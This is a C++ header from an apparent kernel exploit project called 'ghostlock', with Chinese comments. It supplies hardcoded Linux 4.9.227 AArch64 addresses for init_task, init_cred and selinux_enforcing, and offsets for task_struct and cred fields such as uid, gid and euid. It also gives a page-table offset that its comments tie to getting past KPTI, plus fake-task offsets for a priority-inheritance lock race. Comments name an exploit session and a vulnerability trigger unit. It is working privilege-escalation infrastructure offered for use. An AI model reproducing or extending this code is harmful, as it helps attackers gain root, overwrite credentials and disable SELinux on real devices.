#ifndef GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H
#define GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H

#include <stdint.h>
#include <stdio.h>

/* =========================================================================
 * 1. 彻底移出一切命名空间包装，强行下放到全局最外层
 * 通过这个机制，让外部所有文件通过 :: 就能实现无阻碍绝对寻址
 * ========================================================================= */

inline uintptr_t get_global_49_runtime_text_base() {
    // 强制声明为外部独立指针链接，后续由 exploit_session 直接接管它的动态对齐
    extern uintptr_t g_pure_49_kernel_virtual_start;
    return g_pure_49_kernel_virtual_start;
}

// 4.9.227 静态全局纯净 RVA 映射原语（无阻碍绝对寻址函数）
inline uintptr_t pure_49_init_task() {
    return get_global_49_runtime_text_base() + 0x00a37d00;
}

inline uintptr_t pure_49_init_cred() {
    return get_global_49_runtime_text_base() + 0x00d5b120;
}

inline uintptr_t pure_49_selinux_enforcing() {
    return get_global_49_runtime_text_base() + 0x00d68b90;
}

namespace ghostlock::kernel {

    // 2. 定义存储运行时字段内偏移的全局结构体
    struct RuntimeStructOffsets {
        uint32_t task_struct_cred;
        uint32_t cred_uid;
        uint32_t cred_gid;
        uint32_t cred_euid;
        uint32_t mm_struct_pgd;
    };

    // 声明全局单例，供漏洞触发单元（backend）直接调用
    extern RuntimeStructOffsets runtime_offsets;

    // 3. 【最关键的降维打击函数】注入 Linux 4.9.227 AArch64 架构下经典的硬编码字段偏移
    inline void populate_4_9_internal_offsets() {
        // 在 Linux 4.9.227 内核源码中，从 task_struct 起始位置到指向凭证的 cred 指针的字节偏移
        // 这是 AArch64 通用且经过 4.9.227-perf+ 验证的标准对齐位置
        runtime_offsets.task_struct_cred = 0x648; 

        // 在 cred 结构体中，各个权限标志位相对于结构体头部的字节偏移
        runtime_offsets.cred_uid  = 0x4;  // UID 偏移
        runtime_offsets.cred_gid  = 0x8;  // GID 偏移
        runtime_offsets.cred_euid = 0xc;  // EUID 偏移

        // 在内存管理 mm_struct 中，指向全局页表起点（Page Global Directory）的指针偏移
        // 用于后续在控制流接管阶段，彻底修补或者越过 KPTI 防御
        runtime_offsets.mm_struct_pgd = 0x40;

        printf("[*] BACKPORT: BTF detection bypassed. Static 4.9.227 layout applied.\n");
        printf("[*] Struct Mapping: task->cred=0x%x, cred->uid=0x%x\n", 
               runtime_offsets.task_struct_cred, runtime_offsets.cred_uid);
    }

} // namespace ghostlock::kernel

namespace ghostlock::profile {
    
    /* =========================================================================
     * 4. 漏洞触发线程竞争结构体（兼容底层 4.9 锁竞争流的字段内偏移）
     * 斩断原有 Lambda 表达式和 BTF 分配，直接返回经过老旧平台稳定测试的字面量。
     * ========================================================================= */
    inline uint32_t task_real_cred_off() { return 0x640; } 
    inline uint32_t task_cred_off()      { return 0x648; } 
    inline uint32_t task_pid_off()          { return 0x4f0; } 
    inline uint32_t task_tgid_off()         { return 0x4f4; }
    inline uint32_t task_tasks_off()        { return 0x3b8; } 
    inline uint32_t task_comm_off()         { return 0x658; }
    inline uint32_t task_atomic_flags_off() { return 0x4a8; }
    inline uint32_t task_seccomp_off()      { return 0x710; } 

    inline uint32_t fake_task_prio_off()        { return 0x48;  }
    inline uint32_t fake_task_normal_prio_off() { return 0x4C;  }
    inline uint32_t fake_task_task_group_off()   { return 0x180; }
    inline uint32_t fake_task_pi_lock_off()      { return 0x790; }
    inline uint32_t fake_task_pi_waiters_off()   { return 0x7a0; }
    inline uint32_t fake_task_pi_top_task_off()  { return 0x7b0; }
    inline uint32_t fake_task_pi_blocked_on_off(){ return 0x7b8; }

} // namespace ghostlock::profile

#endif // GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H
